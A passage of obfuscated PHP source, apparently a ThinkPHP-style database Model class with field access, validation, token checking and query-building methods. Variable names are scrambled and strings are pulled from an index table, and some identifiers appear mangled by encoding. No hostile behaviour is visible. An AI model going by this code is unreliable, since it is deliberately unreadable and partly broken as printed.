$»Ãñ¥Êé[$Œ¡Ğœ…] = $»Ãñ¥Êé[$àÍÃ¾à]; unset($»Ãñ¥Êé[$àÍÃ¾à]); } } } } return $»Ãñ¥Êé; } public function setField($Ú¯µÃ¾¨, $Ó–’Êá¦ = '') { if (is_array($Ú¯µÃ¾¨)) { $çš®ÈĞš = $Ú¯µÃ¾¨; } else { $çš®ÈĞš[$Ú¯µÃ¾¨] = $Ó–’Êá¦; } return $this->save($çš®ÈĞš); } public function setAdd($°¸ÙúÜ¨, $´÷éº–¨ = 1) { $ƒ…ªÉÊŞ =& $_SERVER[°‰†òö¯]; $“³•í¼ = $°¸ÙúÜ¨ . $ƒ…ªÉÊŞ[373] . $´÷éº–¨; if ($´÷éº–¨ < 0) { $“³•í¼ = $°¸ÙúÜ¨ . $´÷éº–¨; } return $this->setField($°¸ÙúÜ¨, array($ƒ…ªÉÊŞ[374], $“³•í¼)); } public function getField($á¿ŠæŞŞ, $Ä“±¹Ú¾ = null) { $§êøˆ– =& $_SERVER[°‰†òö¯]; $ºäŒÙé¶[$§êøˆ–[352]] = $á¿ŠæŞŞ; $ºäŒÙé¶ = $this->_parseOptions($ºäŒÙé¶); $á¿ŠæŞŞ = trim($á¿ŠæŞŞ); if (strpos($á¿ŠæŞŞ, $§êøˆ–[50])) { if (!isset($ºäŒÙé¶[$§êøˆ–[369]])) { $ºäŒÙé¶[$§êøˆ–[369]] = is_numeric($Ä“±¹Ú¾) ? $Ä“±¹Ú¾ : $§êøˆ–[12]; } $ğß¹¶Õİ = $this->db->select($ºäŒÙé¶); if (!empty($ğß¹¶Õİ)) { $¨¬¿İ±° = explode($§êøˆ–[50], $á¿ŠæŞŞ); $á¿ŠæŞŞ = array_keys($ğß¹¶Õİ[0]); $Ö‰† …Ò = array_shift($á¿ŠæŞŞ); $†Í×ıŞˆ = array_shift($á¿ŠæŞŞ); $ƒÌÀÖ­× = array(); $è³ÙÃÊ = count($¨¬¿İ±°); foreach ($ğß¹¶Õİ as $¾¾´ÊªŞ) { $ŸÅÙØ×ü = $¾¾´ÊªŞ[$Ö‰† …Ò]; if (2 == $è³ÙÃÊ) { $ƒÌÀÖ­×[$ŸÅÙØ×ü] = $¾¾´ÊªŞ[$†Í×ıŞˆ]; } else { $ƒÌÀÖ­×[$ŸÅÙØ×ü] = is_string($Ä“±¹Ú¾) ? implode($Ä“±¹Ú¾, $¾¾´ÊªŞ) : $¾¾´ÊªŞ; } } return $ƒÌÀÖ­×; } } else { if (!0 !== $Ä“±¹Ú¾) { $ºäŒÙé¶[$§êøˆ–[369]] = is_numeric($Ä“±¹Ú¾) ? $Ä“±¹Ú¾ : 1; } if ($Ä“±¹Ú¾ === $§êøˆ–[334]) { unset($ºäŒÙé¶[$§êøˆ–[369]]); } $¾¾´ÊªŞ = $this->db->select($ºäŒÙé¶); if (!empty($¾¾´ÊªŞ)) { if ($Ä“±¹Ú¾ === $§êøˆ–[334]) { return reset($¾¾´ÊªŞ[0]); } if (!0 !== $Ä“±¹Ú¾ && 1 == $ºäŒÙé¶[$§êøˆ–[369]]) { return reset($¾¾´ÊªŞ[0]); } foreach ($¾¾´ÊªŞ as $¿ÈÙç×Å) { $Á†§ƒÜÃ[] = $¿ÈÙç×Å[$á¿ŠæŞŞ]; } return $Á†§ƒÜÃ; } } return null; } public function create($·ÜÚàâ… = '', $œúÔÍ‚° = '') { $„ï²şËÅ =& $_SERVER[°‰†òö¯]; if (empty($·ÜÚàâ…)) { $·ÜÚàâ… = $_POST; } elseif (is_object($·ÜÚàâ…)) { $·ÜÚàâ… = get_object_vars($·ÜÚàâ…); } if (empty($·ÜÚàâ…) || !is_array($·ÜÚàâ…)) { $this->error = think_lang($„ï²şËÅ[350]); return !1; } $·ÜÚàâ… = $this->parseFieldsMap($·ÜÚàâ…, 0); $œúÔÍ‚° = $œúÔÍ‚° ? $œúÔÍ‚° : (!empty($·ÜÚàâ…[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$„ï²şËÅ[352]])) { $—²º˜ — = $this->options[$„ï²şËÅ[352]]; unset($this->options[$„ï²şËÅ[352]]); } elseif ($œúÔÍ‚° == THINK_MODEL_INSERT && isset($this->insertFields)) { $—²º˜ — = $this->insertFields; } elseif ($œúÔÍ‚° == THINK_MODEL_UPDATE && isset($this->updateFields)) { $—²º˜ — = $this->updateFields; } if (isset($—²º˜ —)) { if (is_string($—²º˜ —)) { $—²º˜ — = explode($„ï²şËÅ[50], $—²º˜ —); } if (think_config($„ï²şËÅ[375])) { $—²º˜ —[] = think_config($„ï²şËÅ[376]); } foreach ($·ÜÚàâ… as $ ÏÅ–íî => $¡©àï‘Ï) { if (!in_array($ ÏÅ–íî, $—²º˜ —)) { unset($·ÜÚàâ…[$ ÏÅ–íî]); } } } if (!$this->autoValidation($·ÜÚàâ…, $œúÔÍ‚°)) { return !1; } if (!$this->autoCheckToken($·ÜÚàâ…)) { $this->error = think_lang($„ï²şËÅ[377]); return !1; } if ($this->autoCheckFields) { $—²º˜ — = $this->getDbFields(); foreach ($·ÜÚàâ… as $ ÏÅ–íî => $¡©àï‘Ï) { if (!in_array($ ÏÅ–íî, $—²º˜ —)) { unset($·ÜÚàâ…[$ ÏÅ–íî]); } elseif (MAGIC_QUOTES_GPC && is_string($¡©àï‘Ï)) { $·ÜÚàâ…[$ ÏÅ–íî] = stripslashes($¡©àï‘Ï); } } } $this->autoOperation($·ÜÚàâ…, $œúÔÍ‚°); $this->data = $·ÜÚàâ…; return $·ÜÚàâ…; } public function autoCheckToken($êÍê­Ñš) { $õÉÚ©Œ =& $_SERVER[°‰†òö¯]; if (isset($this->options[$õÉÚ©Œ[378]]) && !$this->options[$õÉÚ©Œ[378]]) { return !0; } if (think_config($õÉÚ©Œ[375])) { $ïÇÂ¾£‘ = think_config($õÉÚ©Œ[376]); if (!isset($êÍê­Ñš[$ïÇÂ¾£‘]) || Session::get($ïÇÂ¾£‘)) { return !1; } list($‹¶ÍË†ä, $‚öãóû») = explode($õÉÚ©Œ[11], $êÍê­Ñš[$ïÇÂ¾£‘]); if ($‚öãóû» && Session::get($ïÇÂ¾£‘ . $õÉÚ©Œ[10] . $‹¶ÍË†ä) === $‚öãóû») { Session::remove($ïÇÂ¾£‘ . $õÉÚ©Œ[10] . $‹¶ÍË†ä); return !0; } if (think_config($õÉÚ©Œ[379])) { Session::remove($ïÇÂ¾£‘ . $õÉÚ©Œ[10] . $‹¶ÍË†ä); } return !1; } return !0; } public function regex($´ŒÈë’, $ÍŸŒŒÁ‡) { $¤Èæ‹ƒ¥ =& $_SERVER[°‰†òö¯]; $Ş„”¾áÃ = array($¤Èæ‹ƒ¥[380] => $¤Èæ‹ƒ¥[381], $¤Èæ‹ƒ¥[382] => $¤Èæ‹ƒ¥[383], $¤Èæ‹ƒ¥[384] => $¤Èæ‹ƒ¥[385], $¤Èæ‹ƒ¥[386] => $¤Èæ‹ƒ¥[387], $¤Èæ‹ƒ¥[388] => $¤Èæ‹ƒ¥[389], $¤Èæ‹ƒ¥[390] => $¤Èæ‹ƒ¥[391], $¤Èæ‹ƒ¥[392] => $¤Èæ‹ƒ¥[393], $¤Èæ‹ƒ¥[367] => $¤Èæ‹ƒ¥[394], $¤Èæ‹ƒ¥[395] => $¤Èæ‹ƒ¥[396]); if (isset($Ş„”¾áÃ[strtolower($ÍŸŒŒÁ‡)])) { $ÍŸŒŒÁ‡ = $Ş„”¾áÃ[strtolower($ÍŸŒŒÁ‡)]; } return preg_match($ÍŸŒŒÁ‡, $´ŒÈë’) === 1; } private function autoOperation(&$¼ä¼ˆ´Å, $¯’€³ßÖ) { $õšı§³Ø =& $_SERVER[°‰†òö¯]; if (!empty($this->options[$õšı§³Ø[397]])) { $Šçå¯” = $this->options[$õšı§³Ø[397]]; unset($this->options[$õšı§³Ø[397]]); } elseif (!empty($this->_auto)) { $Šçå¯” = $this->_auto; } if (isset($Šçå¯”)) { foreach ($Šçå¯” as $á°õ£“¼) { if (empty($á°õ£“¼[2])) { $á°õ£“¼[2] = THINK_MODEL_INSERT; } if ($¯’€³ßÖ == $á°õ£“¼[2] || $á°õ£“¼[2] == THINK_MODEL_BOTH) { switch (trim($á°õ£“¼[3])) { case $õšı§³Ø[398]: case $õšı§³Ø[399]: $¸ï²Íê = isset($á°õ£“¼[4]) ? (array) $á°õ£“¼[4] : array(); if (isset($¼ä¼ˆ´Å[$á°õ£“¼[0]])) { array_unshift($¸ï²Íê, $¼ä¼ˆ´Å[$á°õ£“¼[0]]); } if ($õšı§³Ø[398] == $á°õ£“¼[3]) { $¼ä¼ˆ´Å[$á°õ£“¼[0]] = call_user_func_array($á°õ£“¼[1], $¸ï²Íê); } else { $¼ä¼ˆ´Å[$á°õ£“¼[0]] = call_user_func_array(array(&$this, $á°õ£“¼[1]), $¸ï²Íê); } break; case $õšı§³Ø[352]: $¼ä¼ˆ´Å[$á°õ£“¼[0]] = $¼ä¼ˆ´Å[$á°õ£“¼[1]]; break; case $õšı§³Ø[400]: if ($õšı§³Ø[12] === $¼ä¼ˆ´Å[$á°õ£“¼[0]]) { unset($¼ä¼ˆ´Å[$á°õ£“¼[0]]); } break; case $õšı§³Ø[401]: default: $¼ä¼ˆ´Å[$á°õ£“¼[0]] = $á°õ£“¼[1]; } if (!1 === $¼ä¼ˆ´Å[$á°õ£“¼[0]]) { unset($¼ä¼ˆ´Å[$á°õ£“¼[0]]); } } } } return $¼ä¼ˆ´Å; } protected function autoValidation($‘«ô´—, $¬Àô¼õü) { $Ä»ışÕô =& $_SERVER[°‰†òö¯]; if (!empty($this->options[$Ä»ışÕô[402]])) { $…ü£«Øã = $this->options[$Ä»ışÕô[402]]; unset($this->options[$Ä»ışÕô[402]]); } elseif (!empty($this->_validate)) { $…ü£«Øã = $this->_validate; } if (isset($…ü£«Øã)) { if ($this->patchValidate) { $this->error = array(); } foreach ($…ü£«Øã as $ìÖ’™ë¹ => $ğ«à”İ¯) { if (empty($ğ«à”İ¯[5]) || $ğ«à”İ¯[5] == THINK_MODEL_BOTH || $ğ«à”İ¯[5] == $¬Àô¼õü) { if (0 == strpos($ğ«à”İ¯[2], $Ä»ışÕô[403]) && strpos($ğ«à”İ¯[2], $Ä»ışÕô[404])) { $ğ«à”İ¯[2] = think_lang(substr($ğ«à”İ¯[2], 2, -1)); } $ğ«à”İ¯[3] = isset($ğ«à”İ¯[3]) ? $ğ«à”İ¯[3] : THINK_EXISTS_VALIDATE; $ğ«à”İ¯[4] = isset($ğ«à”İ¯[4]) ? $ğ«à”İ¯[4] : $Ä»ışÕô[405]; switch ($ğ«à”İ¯[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($‘«ô´—, $ğ«à”İ¯)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ä»ışÕô[12] != trim($‘«ô´—[$ğ«à”İ¯[0]])) { if (!1 === $this->_validationField($‘«ô´—, $ğ«à”İ¯)) { return !1; } } break; default: if (isset($‘«ô´—[$ğ«à”İ¯[0]])) { if (!1 === $this->_validationField($‘«ô´—, $ğ«à”İ¯)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ğÉı‰ÆÁ, $Áö“Ø—ª) { if (!1 === $this->_validationFieldItem($ğÉı‰ÆÁ, $Áö“Ø—ª)) { if ($this->patchValidate) { $this->error[$Áö“Ø—ª[0]] = $Áö“Ø—ª[2]; } else { $this->error = $Áö“Ø—ª[2]; return !1; } } return; } protected function _validationFieldItem($‹µ ‰½Í, $•Ä—÷Š) { $Ê–¤ñº =& $_SERVER[°‰†òö¯]; switch (strtolower(trim($•Ä—÷Š[4]))) { case $Ê–¤ñº[398]: case $Ê–¤ñº[399]: $ôìÁêõ¦ = isset($•Ä—÷Š[6]) ? (array) $•Ä—÷Š[6] : array(); if (is_string($•Ä—÷Š[0]) && strpos($•Ä—÷Š[0], $Ê–¤ñº[50])) { $•Ä—÷Š[0] = explode($Ê–¤ñº[50], $•Ä—÷Š[0]); } if (is_array($•Ä—÷Š[0])) { foreach ($•Ä—÷Š[0] as $Ü¼Ù™ùÖ) { $¿¼½Ìƒß[$Ü¼Ù™ùÖ] = $‹µ ‰½Í[$Ü¼Ù™ùÖ]; } array_unshift($ôìÁêõ¦, $¿¼½Ìƒß); } else { array_unshift($ôìÁêõ¦, $‹µ ‰½Í[$•Ä—÷Š[0]]); } if ($Ê–¤ñº[398] == $•Ä—÷Š[4]) { return call_user_func_array($•Ä—÷Š[1], $ôìÁêõ¦); } else { return call_user_func_array(array(&$this, $•Ä—÷Š[1]), $ôìÁêõ¦); } case $Ê–¤ñº[406]: return $‹µ ‰½Í[$•Ä—÷Š[0]] == $‹µ ‰½Í[$•Ä—÷Š[1]]; case $Ê–¤ñº[407]: if (is_string($•Ä—÷Š[0]) && strpos($•Ä—÷Š[0], $Ê–¤ñº[50])) { $•Ä—÷Š[0] = explode($Ê–¤ñº[50], $•Ä—÷Š[0]); } $»Å…³© = array(); if (is_array($•Ä—÷Š[0])) { foreach ($•Ä—÷Š[0] as $Ü¼Ù™ùÖ) { $»Å…³©[$Ü¼Ù™ùÖ] = $‹µ ‰½Í[$Ü¼Ù™ùÖ]; } } else { $»Å…³©[$•Ä—÷Š[0]] = $‹µ ‰½Í[$•Ä—÷Š[0]]; } if (!empty($‹µ ‰½Í[$this->getPk()])) { $»Å…³©[$this->getPk()] = array($Ê–¤ñº[408], $‹µ ‰½Í[$this->getPk()]); } if ($this->where($»Å…³©)->find()) { return !1; } return !0; default: return $this->check($‹µ ‰½Í[$•Ä—÷Š[0]], $•Ä—÷Š[1], $•Ä—÷Š[4]); } } public function check($Ê—ú¼İÓ, $‰„Ñ·Œ, $Ù›Şºã™ = "\162\145\x67\x65\170") { $ÕÁ²¦å =& $_SERVER[°‰†òö¯]; $Ù›Şºã™ = strtolower(trim($Ù›Şºã™)); switch ($Ù›Şºã™) { case $ÕÁ²¦å[7]: case $ÕÁ²¦å[409]: $Ëë‚Ùãí = is_array($‰„Ñ·Œ) ? $‰„Ñ·Œ : explode($ÕÁ²¦å[50], $‰„Ñ·Œ); return $Ù›Şºã™ == $ÕÁ²¦å[7] ? in_array($Ê—ú¼İÓ, $Ëë‚Ùãí) : !in_array($Ê—ú¼İÓ, $Ëë‚Ùãí); case $ÕÁ²¦å[410]: case $ÕÁ²¦å[411]: if (is_array($‰„Ñ·Œ)) { $„¹ÂÚÈ = $‰„Ñ·Œ[0]; $Š¹Àò± = $‰„Ñ·Œ[1]; } else { list($„¹ÂÚÈ, $Š¹Àò±) = explode($ÕÁ²¦å[50], $‰„Ñ·Œ); } return $Ù›Şºã™ == $ÕÁ²¦å[410] ? $Ê—ú¼İÓ >= $„¹ÂÚÈ && $Ê—ú¼İÓ <= $Š¹Àò± : $Ê—ú¼İÓ < $„¹ÂÚÈ || $Ê—ú¼İÓ > $Š¹Àò±; case $ÕÁ²¦å[412]: case $ÕÁ²¦å[413]: return $Ù›Şºã™ == $ÕÁ²¦å[412] ? $Ê—ú¼İÓ == $‰„Ñ·Œ : $Ê—ú¼İÓ != $‰„Ñ·Œ; case $ÕÁ²¦å[414]: $©¬ëÍª– = mb_strlen($Ê—ú¼İÓ, $ÕÁ²¦å[415]); if (strpos($‰„Ñ·Œ, $ÕÁ²¦å[50])) { list($„¹ÂÚÈ, $Š¹Àò±) = explode($ÕÁ²¦å[50], $‰„Ñ·Œ); return $©¬ëÍª– >= $„¹ÂÚÈ && $©¬ëÍª– <= $Š¹Àò±; } else { return $©¬ëÍª– == $‰„Ñ·Œ; } case $ÕÁ²¦å[416]: list($£ë¥äŞ, $İ¾˜ÑıŞ) = explode($ÕÁ²¦å[50], $‰„Ñ·Œ); if (!is_numeric($£ë¥äŞ)) { $£ë¥äŞ = strtotime($£ë¥äŞ); } if (!is_numeric($İ¾˜ÑıŞ)) { $İ¾˜ÑıŞ = strtotime($İ¾˜ÑıŞ); } return NOW_TIME >= $£ë¥äŞ && NOW_TIME <= $İ¾˜ÑıŞ; case $ÕÁ²¦å[417]: return in_array(get_client_ip(), explode($ÕÁ²¦å[50], $‰„Ñ·Œ)); case $ÕÁ²¦å[418]: return !in_array(get_client_ip(), explode($ÕÁ²¦å[50], $‰„Ñ·Œ)); case $ÕÁ²¦å[405]: default: return $this->regex($Ê—ú¼İÓ, $‰„Ñ·Œ); } } public function query($ÁìªİÄ, $”Åç‹ º = false) { $€î§¬¯Š =& $_SERVER[°‰†òö¯]; if (!is_bool($”Åç‹ º) && !is_array($”Åç‹ º)) { $”Åç‹ º = func_get_args(); array_shift($”Åç‹ º); } $ÁìªİÄ = str_replace(array($€î§¬¯Š[287], $€î§¬¯Š[419]), $€î§¬¯Š[53], $ÁìªİÄ); $ÁìªİÄ = $this->parseSql($ÁìªİÄ, $”Åç‹ º); return $this->db->query($ÁìªİÄ); } public function execute($è™¬â¶÷, $±µùÀïÁ = false) { if (!is_bool($±µùÀïÁ) && !is_array($±µùÀïÁ)) { $±µùÀïÁ = func_get_args(); array_shift($±µùÀïÁ); } $è™¬â¶÷ = $this->parseSql($è™¬â¶÷, $±µùÀïÁ); return $this->db->execute($è™¬â¶÷); } protected function parseSql($ùÄø¸š, $Õ»®š¢) { $Ğí¯ªµ =& $_SERVER[°‰†òö¯]; if (!0 === $Õ»®š¢) { $å³¶É²¸ = $this->_parseOptions(); $ùÄø¸š = $this->db->parseSql($ùÄø¸š, $å³¶É²¸); } elseif (is_array($Õ»®š¢)) { $Õ»®š¢ = array_map(array($this->db, $Ğí¯ªµ[420]), $Õ»®š¢); $ùÄø¸š = vsprintf($ùÄø¸š, $Õ»®š¢); } else { $ùÄø¸š = strtr($ùÄø¸š, array($Ğí¯ªµ[421] => $this->getTableName(), $Ğí¯ªµ[422] => think_config($Ğí¯ªµ[323]))); } $this->db->setModel($this->name); return $ùÄø¸š; } public function db($´¶ÜëÛ“ = '', $ı½¯öÀ = '', $†¼ë¹®± = array()) { $’òÍİÇÍ =& $_SERVER[°‰†òö¯]; if ($’òÍİÇÍ[12] === $´¶ÜëÛ“ && $this->db) { return $this->db; } static $Ì³–éÛ = array(); static $À‚Ô¢Œ = array(); if (!isset($À‚Ô¢Œ[$´¶ÜëÛ“]) || isset($À‚Ô¢Œ[$´¶ÜëÛ“]) && $ı½¯öÀ && $Ì³–éÛ[$´¶ÜëÛ“] != $ı½¯öÀ) { if (!empty($ı½¯öÀ) && is_string($ı½¯öÀ) && !1 === strpos($ı½¯öÀ, $’òÍİÇÍ[8])) { $ı½¯öÀ = think_config($ı½¯öÀ); } $´¶ÜëÛ“ = think_guid($ı½¯öÀ); $À‚Ô¢Œ[$´¶ÜëÛ“] = Db::getInstance($ı½¯öÀ); } elseif (NULL === $ı½¯öÀ) { $À‚Ô¢Œ[$´¶ÜëÛ“]->close(); unset($À‚Ô¢Œ[$´¶ÜëÛ“]); return; } if (!empty($†¼ë¹®±)) { if (is_string($†¼ë¹®±)) { parse_str($†¼ë¹®±, $†¼ë¹®±); } foreach ($†¼ë¹®± as $şø—¶Öğ => $şœì©¡ ) { $this->setProperty($şø—¶Öğ, $şœì©¡ ); } } $Ì³–éÛ[$´¶ÜëÛ“] = $ı½¯öÀ; $this->db = $À‚Ô¢Œ[$´¶ÜëÛ“]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Úš‘Âä· = get_class($this); if ($Úš‘Âä· == $_SERVER[°‰†òö¯][423]) { return $this->name; } $this->name = substr($Úš‘Âä·, 0, -5); } return $this->name; } public function getTableName() { $šÛåÙóø =& $_SERVER[°‰†òö¯]; if (empty($this->trueTableName)) { $Û§Šª‡Ö = !empty($this->tablePrefix) ? $this->tablePrefix : $šÛåÙóø[12]; if (!empty($this->tableName)) { $Û§Šª‡Ö .= $this->tableName; } else { $Û§Šª‡Ö .= think_parse_name($this->name); } $this->trueTableName = strtolower($Û§Šª‡Ö); } return (!empty($this->dbName) ? $this->dbName . $šÛåÙóø[10] : $šÛåÙóø[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $å£æçˆ =& $_SERVER[°‰†òö¯]; return isset($this->fields[$å£æçˆ[330]]) ? $this->fields[$å£æçˆ[330]] : $this->pk; } public function getDbFields() { $û±íê„© =& $_SERVER[°‰†òö¯]; if (isset($this->options[$û±íê„©[358]])) { $•±×¦Ãœ = $this->db->getFields($this->options[$û±íê„©[358]]); return $•±×¦Ãœ ? array_keys($•±×¦Ãœ) : !1; } if ($this->fields) { $•±×¦Ãœ = $this->fields; unset($•±×¦Ãœ[$û±íê„©[329]], $•±×¦Ãœ[$û±íê„©[330]], $•±×¦Ãœ[$û±íê„©[331]], $•±×¦Ãœ[$û±íê„©[328]]); return $•±×¦Ãœ; } return !1; } public function data($ÚŸÜÓğ¶ = '') { $·ï­’ÚŒ =& $_SERVER[°‰†òö¯]; if ($·ï­’ÚŒ[12] === $ÚŸÜÓğ¶ && !empty($this->data)) { return $this->data; } if (is_object($ÚŸÜÓğ¶)) { $ÚŸÜÓğ¶ = get_object_vars($ÚŸÜÓğ¶); } elseif (is_string($ÚŸÜÓğ¶)) { parse_str($ÚŸÜÓğ¶, $ÚŸÜÓğ¶); } elseif (!is_array($ÚŸÜÓğ¶)) { think_exception(think_lang($·ï­’ÚŒ[350])); } $this->data = $ÚŸÜÓğ¶; return $this; } public function join($÷šÓàùá) { $Ç²‹Õ¸³ =& $_SERVER[°‰†òö¯]; if (is_array($÷šÓàùá)) { $this->options[$Ç²‹Õ¸³[361]] = $÷šÓàùá; } elseif (!empty($÷šÓàùá)) { $this->options[$Ç²‹Õ¸³[361]][] = $÷šÓàùá; } return $this; } public function union($Í‚³ò÷, $Üı¥›ßˆ = false) { $Ê¹ùğ© =& $_SERVER[°‰†òö¯]; if (empty($Í‚³ò÷)) { return $this; } if ($Üı¥›ßˆ) { $this->options[$Ê¹ùğ©[424]][$Ê¹ùğ©[425]] = !0; } if (is_object($Í‚³ò÷)) { $Í‚³ò÷ = get_object_vars($Í‚³ò÷); } if (is_string($Í‚³ò÷)) { $™éì€ = $Í‚³ò÷; } elseif (is_array($Í‚³ò÷)) { if (isset($Í‚³ò÷[0])) { $this->options[$Ê¹ùğ©[424]] = array_merge($this->options[$Ê¹ùğ©[424]], $Í‚³ò÷); return $this; } else { $™éì€ = $Í‚³ò÷; } } else { think_exception(think_lang($Ê¹ùğ©[350])); } $this->options[$Ê¹ùğ©[424]][] = $™éì€; return $this; } public function cache($šÙËåÎ³ = true, $Ş‚Ú¯– = null, $·êÍü¿ = '') { $ÜİùÂõù =& $_SERVER[°‰†òö¯]; if (!1 !== $šÙËåÎ³) { $this->options[$ÜİùÂõù[426]] = array($ÜİùÂõù[97] => $šÙËåÎ³, $ÜİùÂõù[416] => $Ş‚Ú¯–, $ÜİùÂõù[33] => $·êÍü¿); } return $this; } public function field($ø¹óãğ, $ŒÀíÂÅ’ = false) { $¼ÔµÓñã =& $_SERVER[°‰†òö¯]; if (!0 === $ø¹óãğ) { $‘¥çñÃ° = $this->getDbFields(); $ø¹óãğ = $‘¥çñÃ° ? $‘¥çñÃ° : $¼ÔµÓñã[222]; } elseif ($ŒÀíÂÅ’) { if (is_string($ø¹óãğ)) { $ø¹óãğ = explode($¼ÔµÓñã[50], $ø¹óãğ); } $‘¥çñÃ° = $this->getDbFields(); $ø¹óãğ = $‘¥çñÃ° ? array_diff($‘¥çñÃ°, $ø¹óãğ) : $ø¹óãğ; } $this->options[$¼ÔµÓñã[352]] = $ø¹óãğ; return $this; } public function scope($¹Ú¨®® = '', $Ï§–®Ö = NULL) { $Ñù—ÀÃ =& $_SERVER[°‰†òö¯]; if ($Ñù—ÀÃ[12] === $¹Ú¨®®) { if (isset($this->_scope[$Ñù—ÀÃ[37]])) { $‘Š»Ï„‰ = $this->_scope[$Ñù—ÀÃ[37]]; } else { return $this; } } elseif (is_string($¹Ú¨®®)) { $˜”æ¬¢ô = explode($Ñù—ÀÃ[50], $¹Ú¨®®); $‘Š»Ï„‰ = array(); foreach ($˜”æ¬¢ô as $©Í†‚ë) { if (!isset($this->_scope[$©Í†‚ë])) { continue; } $‘Š»Ï„‰ = array_merge($‘Š»Ï„‰, $this->_scope[$©Í†‚ë]); } if (!empty($Ï§–®Ö) && is_array($Ï§–®Ö)) { $‘Š»Ï„‰ = array_merge($‘Š»Ï„‰, $Ï§–®Ö); } } elseif (is_array($¹Ú¨®®)) { $‘Š»Ï„‰ = $¹Ú¨®®; } if (is_array($‘Š»Ï„‰) && !empty($‘Š»Ï„‰)) { $this->options = array_merge($this->options, array_change_key_case($‘Š»Ï„‰)); } return $this; } public function where($ñºóà›“, $çéì¢š = null) { $êÔÚÁ„­ =& $_SERVER[°‰†òö¯]; if (!is_null($çéì¢š) && is_string($ñºóà›“)) { if (!is_array($çéì¢š)) { $çéì¢š = func_get_args(); array_shift($çéì¢š); } $çéì¢š = array_map(array($this->db, $êÔÚÁ„­[420]), $çéì¢š); $ñºóà›“ = vsprintf($ñºóà›“, $çéì¢š); } elseif (is_object($ñºóà›“)) { $ñºóà›“ = get_object_vars($ñºóà›“); } elseif (is_array($ñºóà›“)) { foreach ($ñºóà›“ as $Å„à¿ıØ => $¶ùõÉ÷ˆ) { if ((is_numeric($Å„à¿ıØ) || !$Å„à¿ıØ) && is_string($¶ùõÉ÷ˆ)) { if (strpos($¶ùõÉ÷ˆ, $êÔÚÁ„­[427]) === 0) { continue; } think_trace($êÔÚÁ„­[428], $êÔÚÁ„­[12], $êÔÚÁ„­[49]); die; } } } if (is_string($ñºóà›“) && $êÔÚÁ„­[12] != $ñºóà›“) { $ èü®÷ = array(); $ èü®÷[$êÔÚÁ„­[429]] = $ñºóà›“; $ñºóà›“ = $ èü®÷; } if (isset($this->options[$êÔÚÁ„­[354]])) { $this->options[$êÔÚÁ„­[354]] = array_merge($this->options[$êÔÚÁ„­[354]], $ñºóà›“); } else { $this->options[$êÔÚÁ„­[354]] = $ñºóà›“; } return $this; } public function limit($«õ‰åÎ×, $áÒÜî«‚ = null) { $£¤ã„Äµ =& $_SERVER[°‰†òö¯]; $this->options[$£¤ã„Äµ[369]] = is_null($áÒÜî«‚) ? $«õ‰åÎ× : $«õ‰åÎ× . $£¤ã„Äµ[50] . $áÒÜî«‚; return $this; } public function page($•ë–äğá, $ãÚ¼¿Ğœ = null) { $ú«üÁÛ =& $_SERVER[°‰†òö¯]; $this->options[$ú«üÁÛ[430]] = is_null($ãÚ¼¿Ğœ) ? $•ë–äğá : $•ë–äğá . $ú«üÁÛ[50] . $ãÚ¼¿Ğœ; return $this; } public function comment($êÚ”± Ğ) { $this->options[$_SERVER[°‰†òö¯][431]] = $êÚ”± Ğ; return $this; } public function setProperty($Èï²èª, $“´¬ê) { if (property_exists($this, $Èï²èª)) { $this->{$Èï²èª} = $“´¬ê; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\x54\x69\x6d\x65", "\164\x69\x6d\145", "\x69\156\x73\145\x72\164\x2c\x75\x70\x64\x61\x74\x65", "\x66\165\x6e\x63\164\x69\157\156"), array("\x63\x72\145\141\x74\x65\x54\151\x6d\145", "\x74\151\155\x65", "\x69\156\163\145\162\164", "\146\x75\x6e\143\x74\151\157\x6e")); public function setDataAuto($¢¬¼€­ç) { $this->dataAuto = $¢¬¼€­ç; } public function __construct($±½…µ‹ = '', $–¥Ëƒ¥ğ = '', $ÎœÄç½Ï = '') { parent::__construct($±½…µ‹, $–¥Ëƒ¥ğ, $ÎœÄç½Ï); } protected $tableMeta = array(); protected function _beforeInsert(&$é¼Ü³Â², $÷¥¨œøó) { $óÖ¨£ØË =& $_SERVER[°‰†òö¯]; if (!$this->checkDataAutoHas($óÖ¨£ØË[432])) { return; } $this->dataBeforeFilter($é¼Ü³Â², $óÖ¨£ØË[432]); } protected function _beforeUpdate(&$€·Ú¬¬‹, $ßÆÏ‘²‚) { $¸Ñè‚Šå =& $_SERVER[°‰†òö¯]; if (!$this->checkDataAutoHas($¸Ñè‚Šå[433])) { return; } $this->dataBeforeFilter($€·Ú¬¬‹, $¸Ñè‚Šå[433]); } protected function _afterSelect(&$Ûçó‘ğˆ, $å‘“æ”¢) { if (!is_array($Ûçó‘ğˆ)) { return; } if (!$this->checkDataAutoHas($_SERVER[°‰†òö¯][434])) { return; } foreach ($Ûçó‘ğˆ as &$ƒŒ¨Éğ) { $this->dataAfterFilter($ƒŒ¨Éğ); } unset($ƒŒ¨Éğ); } protected function _afterFind(&$Á°¸“÷Ë, $½•¡¬ÎŠ) { if (!is_array($Á°¸“÷Ë)) { return; } if (!$this->checkDataAutoHas($_SERVER[°‰†òö¯][434])) { return; } $this->dataAfterFilter($Á°¸“÷Ë); } public static function textEncode($ãş¼ñ») { if (!$ãş¼ñ») { return $ãş¼ñ»; } $ŞÄ…¢Ï† = json_encode($ãş¼ñ»); $ŞÄ…¢Ï† = preg_replace_callback($_SERVER[°‰†òö¯][435], function ($ğ—ÊşšÒ) { return addslashes($ğ—ÊşšÒ[0]); }, $ŞÄ…¢Ï†); return json_decode($ŞÄ…¢Ï†); } public static function textDecode($÷öõ³) { $Ó®¶…®ß =& $_SERVER[°‰†òö¯]; $Ñ™±İ´ = json_encode($÷öõ³); $Ñ™±İ´ = 